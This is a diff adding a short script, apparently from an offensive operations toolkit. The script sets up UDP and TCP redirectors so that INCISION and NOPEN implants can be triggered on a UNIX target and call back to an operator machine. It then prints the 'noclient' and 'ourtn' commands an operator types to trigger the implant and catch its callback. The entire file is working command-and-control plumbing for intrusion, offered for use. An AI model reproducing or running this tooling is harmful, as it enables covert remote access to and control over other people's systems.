@@ -1,0 +1,37 @@
+#-------------------------------------------------------------------------------
+# Description: sets up redirectors for a UNIX-type (INCISION/NOPEN) redirect
+#
+#-------------------------------------------------------------------------------
+
+if ($argc < 5) {
+	echo "Usage: $argv[0] <local IP of the Windows op machine> <local IP of the UNIX op machine> <incision trigger local tcp port> <incision callback port> <nopen callback port>";
+	return false;
+}
+
+string $localIP=$argv[1];
+string $localUnixIP=$argv[2];
+string $triggerPort=$argv[3];
+string $incisionPort=$argv[4];
+string $nopenPort=$argv[5];
+
+ifnot(`background packetredirect -packettype udp -listenPort $triggerPort -bind $localIP`) {
+	echo "Couldn't start incision trigger redirector.";
+	return false;
+}
+
+ifnot(`background redirect -tcp -implantlisten $incisionPort -target $localUnixIP $incisionPort`) {
+	echo "Couldn't start incision callback redirector.";
+	return false;
+}
+
+ifnot(`background redirect -tcp -implantlisten $nopenPort -target $localUnixIP $nopenPort`) {
+	echo "Couldn't start nopen callback redirector.";
+	return false;
+}
+
+echo "Redirection has been set up.  UNIX operator should type :";
+echo "  noclient -l $nopenPort";
+echo "  ourtn -ueW $localIP:$triggerPort -i <windows redirector IP> -C <windows redirector IP> -p $incisionPort -O $nopenPort <actual UNIX target IP>";
+echo "Remember, the windows redirector IP should be the IP seen by the UNIX target, so possibly the internal IP address.";
+
+return true;
